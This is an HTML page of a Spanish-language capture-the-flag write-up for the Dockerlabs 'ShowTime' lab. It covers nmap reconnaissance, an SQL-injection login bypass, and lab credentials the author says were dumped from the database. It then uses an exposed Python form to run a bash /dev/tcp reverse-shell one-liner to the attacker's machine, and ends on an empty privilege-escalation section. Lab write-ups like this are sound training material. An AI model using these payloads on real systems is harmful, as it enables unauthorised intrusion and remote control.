<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S31sh1r0</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/prism.css">
    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/writeups.css">
    <link rel="stylesheet" href="https://n4g1h4ck.github.io/css/writeup_article.css">
</head>
<body>
    <header class="header">
        <nav class="navbar">
            <a href="https://n4g1h4ck.github.io/index.html">Inicio</a>
            <a href="https://n4g1h4ck.github.io/tools.html">Herramientas</a>
            <a href="https://n4g1h4ck.github.io/writeups.html">Writeups</a>
        </nav>
    </header>
    <div class="wrapper">
        <asíde class="sidebar">
            <h3 class="index">Índice</h3>
            <div class="platforms">
                <h4 class="dockerlabs">Dockerlabs</h4>
                <ul class="list_writeups">
                    <li><a href="https://n4g1h4ck.github.io/DL/showtime/showtime.html">HackZones</a></li>
                    <li><a href="https://n4g1h4ck.github.io/dl/showtime.html">ShowTime</a></li>
                </ul>
                <h4 class="hackthebox">Hackthebox</h4>
                <ul class="list_writeups">
                </ul>
            </div>
        </asíde>

        <main class="content">
            <article class="writeup">
                <h2 class="writeup_title">ShowTime</h2>
                <h2 class="writeup_platform">Plataforma: <span class="dl">Dockerlabs</span></h2>
                <h3 class="writeup_subtitle">Fase de Reconocimiento</h3>
                <p class="description">
                    Primero enviamos un <i>ping</i> a la máquina para saber si tenemos conectividad.
                </p>
                <pre class="code"><code class="language-ruby">$ ping -c 1 172.17.0.2

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.139 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.139/0.139/0.139/0.000 ms</code></pre>
                <p class="description">
                    Gracias al <span class="highlight">ttl</span> nos podemos dar cuenta que la máquina es una <b>Linux</b>, ya que usualmente un ttl de 64 = Linux y un ttl 128 = Windows (<i>aunque tambien debemos tener en cuenta que este valor se puede cambiar</i>)
                </p>
                <p class="description">
                    Utilizando <span class="highlight">nmap</span> escaneamos los puertos abiertos de la máquina víctima:
                </p>
                <pre class="code"><code class="language-ruby">nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 172.17.0.2 -oG allPorts</code></pre>
                <p class="description">
                    Con el parámetro <code class="language-ruby">-p-</code> le indicamos que queremos escanear todo el rango de puertos (<i>del 1 al 65535</i>).
                    <br>
                    <br>
                    Como queremos que nos reporte solo los puertos abiertos le ponemos el <code class="language-ruby">--open</code>
                    <br>
                    <br>
                    El <code class="language-ruby">--min-rate 5000</code> es para decirle que queremos enviar paquetes no mas lentos que 5000 paquetes por segundo.
                    <br>
                    <br>
                    Con el parámetro <code class="language-ruby">-sS</code> le indicamos a Nmap que realice un escaneo sigiloso (<i>stealth scan</i>), con esto no concluimos el <b>three way handshake</b>.
                    <br><br>
                    El parámetro <code class="language-ruby">-n</code> se lo ponemos para que no nos haga resolución DNS.
                    <br><br>
                    El <code class="language-ruby">-Pn</code> funciona para que no nos haga descubrimiento de host.
                    <br><br>
                    Con el <i>triple verbose</i> <code class="language-ruby">-vvv</code> le indicamos que a medida de que me vaya realizando el escaneo nos vaya mostrando todo por consola.
                    <br><br>
                    Y por último, con el parámetro <code class="language-ruby">-oG allPorts</code> le indicamos que queremos exportar la evidencia en un formato grepeable al archivo <i>allPorts</i>, para que mas adelante con la herramienta <b>extractPorts</b> nos copie los puertos en la clipboard.
                </p>
                <p class="description">Si esperamos a que finalice el escaneo y hacemos un <span class="highlight">cat</span> al archivo <i>allPorts</i> este nos debería mostrar algo así:</p>
                <pre class="code"><code class="language-text"># Nmap 7.94SVN scan initiated Tue Dec 17 12:51:32 2024 as: nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG allPorts 172.17.0.2
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 172.17.0.2 ()	Status: Up
Host: 172.17.0.2 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
# Nmap done at Tue Dec 17 12:51:33 2024 -- 1 IP address (1 host up) scanned in 1.09 seconds</code></pre>
                <p class="description">Se ve feo pero el objetivo de esto es que si hacemos un <code class="language-ruby">extractPorts allPorts</code> nos debería de haber copiado los puertos en la clipboard</p>
                <p class="description">Luego de esto, con Ctrl+shift+v copio los puertos y realizo un escaneo más a fondo:</p>
                <pre class="code"><code class="language-ruby">nmap -sCV -p22,80 172.17.0.2 -oN targeted</code></pre>
                <p class="description">
                    Con el parámetro <code class="language-ruby">-sCV</code> le indico a nmap que quiero que aplique algunos <i>scripts de reconocimiento</i> y me detecte las versiones y servicios que emplean cada uno de los puertos.
                    <br><br>
                    Con <code class="language-ruby">-p22,80</code> le indico los puertos.
                    Y al final, con el parámetros <code class="language-ruby">-oN targeted</code> le digo a nmap que me exporte la evidencia tal cual me la muestra por consola al archivo <i>targeted</i>.
                </p>
                <p class="description">El output se vería algo así:</p>
                <pre class="code"><code class="language-ruby"># Nmap 7.94SVN scan initiated Tue Dec 17 12:51:43 2024 as: nmap -sCV -p22,80 -oN targeted 172.17.0.2
Nmap scan report for hackzones.hl (172.17.0.2)
Host is up (0.000037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:9a:9f:b3:17:be:3d:2e:12:05:0f:a4:61:c3:b3:76 (ECDSA)
|_  256 69:8f:5c:4f:14:b0:4d:b6:b7:59:34:4d:b9:03:40:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: cs
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 17 12:51:50 2024 -- 1 IP address (1 host up) scanned in 7.75 seconds</code></pre>
                <p class="description">
                    En el navegador abro el servicio http y muestra este sitio web:
                    <br><br>
                    <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime.png" alt="showtime web">
                    <br><br>
                    Parece que la web tiene temática de casino. En la esquina superior derecha vemos un botón que dice <i>login</i>, si lo presionamos nos dirige a un panel de login.
                </p>
                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime2.png" alt="showtime web">
                <p class="description">
                    Intente un <i>SQL Injection</i> sencillo (<code class="language-sql">test' or 1=1-- -</code>) y funcionó!.
                </p>
                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime3.png" alt="showtime web">
                <p class="description">
                    Al ver que el login es vulnerable a una inyección sql, tratare de probar una <i>inyección SQL ciega basada en tiempo</i>. Pueden utilizar <span class="highlight">SQLMap</span> para esta parte, sin embargo yo prefiero los metodos manuales así que hare unos <i>scripts en python</i> para que me automatice la explotación de la vulnerabilidad. En mis <a target="_blank" href="https://n4g1h4ck.github.io/tools.html" class="highlight">Herramientas</a> estarán los scripts explicados para los que quieran utilizarlos.
                </p>
                <h2 class="writeup_subtitle">Inyección SQL ciega basada en tiempo</h2>
                <p class="description">
                    Despues de ejecutar el script para determinar el nombre de la base de datos utilizada, me muestra que es <i>users</i>, gracias a este dato puedo utilizar el siguiente script para enumerar las tablas que emplea la base de datos.
                    <br><br>
                    Al finalizar la <i>fuerza bruta</i>, muestra que solo contiene una tabla llamada <i>usuarios</i>, ahora puedo pasar al siguiente script para enumerar las columnas.
                    <br><br>
                    Gracias al script nos damos cuenta que las columnas que contiene la tabla <i>usuarios</i> son <i>id,username y password</i>. Sabiendo todo lo anterior, ahora se viene lo bueno, con el ultimo script vamos a enumerar los valores que contienen las columnas de la base de datos.
                    <br><br>
                    EL ultimo script muestra las siguientes credenciales:
                    <br><br>
                    <i class="highlight">1:lucas:1233211233212:santiago:1234561234563:joe:miclaveesinhackeable</i>
                    <br><br>
                    Donde primero esta el <i class="highlight">nombre de usuario</i> (sin contar el id), luego estan ':' y la <i class="highlight">contraseña</i> del usuario.
                </p>
                <p class="description">
                    Si probamos las credenciales en el login, vemos que al usuario <i class="highlight">joe</i> lo redirige a <i class="highlight">http://172.17.0.2/login_page/admin-panel.php</i>.
                </p>
                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime4.png" alt="showtime web">
                <p class="description">
                    Vemos que hay un formulario que interpreta codigo python, si escribimos <code class="language-python">print('hola')</code> vemos que nos muestra el output. Lo siguiente que vamos a hacer es verificar si podemos ejecutar comandos con el modulo <i class="highlight">os</i> con este codigo:
                </p>
                <pre class="code"><code class="language-python">import os
os.system('whoami')</code></pre>
                <br><br>
                <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime4.png" alt="showtime web">
                <p class="description">Vemos que tenemos capacidad de ejecutar comandos, asi que vamos a utilizar un <i>oneliner en bash</i> para obtener una conexion por tcp hacia mi maquina atacante</p>
                <pre class="code"><code class="language-python">import os
os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_máquina_ATACANTE/PUERTO_LOCAL 0>&1"')</code></pre>
                <p class="description">
                    Si estamos en una terminal con <i class="highlight">netcat</i> en escucha por el puerto especificado y ejecutamos el codigo python, obtendremos una reverse shell a nuestro equipo.
                </p>
                <h3 class="writeup_subtitle">Tratamiento de la tty</h3>
                <p class="description">Empezamos dándonos una <i>pseudoconsola</i></p>
                <pre class="code"><code class="language-ruby">script /dev/null -c bash</code></pre>
                <p class="description">Ahora presionamos en el teclado <i>Ctrl+z</i></p>
                <p class="description">Luego de esto escribimos lo siguiente</p>
                <pre class="code"><code class="language-ruby">stty raw -echo;fg</code></pre>
                <p class="description">Después escribimos</p>
                <pre class="code"><code class="language-ruby">reset xterm</code></pre>
                <p class="description">Ahora podemos ejecutar Ctrl+c sin que afecte a la terminal, para ejecutar <i>Ctrl+l</i> y se nos limpie la pantalla debemos ejecutar <span class="highlight">export TERM=xterm</span> y ahora debería funcionar</p>
                <p class="description">
                    si ejecutamos <i class="highlight">nano</i> vemos que las proporciones no son las adecuadas, para cambiarlo nos iremos a una terminal a parte y ejecutaremos <code class="language-ruby">stty size</code> y respondera con dos valores, por ejemplo: 36 140.
                    <br><br>
                    Entonces, en la terminal donde estabamos antes ejecutaremos <code class="language-ruby">stty rows 36 columns 140</code> para cambiar las dimensiones, ahora si ejecutamos <i class="highlight">nano</i> este debería tener las proporciones verdaderas.
                </p>
                <h3 class="writeup_subtitle">Escalada de Privilegios</h3>
                <p class="description">
                   
                </p>
            </article>
        </main>
    </div>
    <footer class="footer">
        <a target="_blank" href="https://github.com/n4g1h4ck" class="link bi bi-github"></a>
    </footer>
    <script src="https://n4g1h4ck.github.io/js/prism.js"></script>
</body>
</html>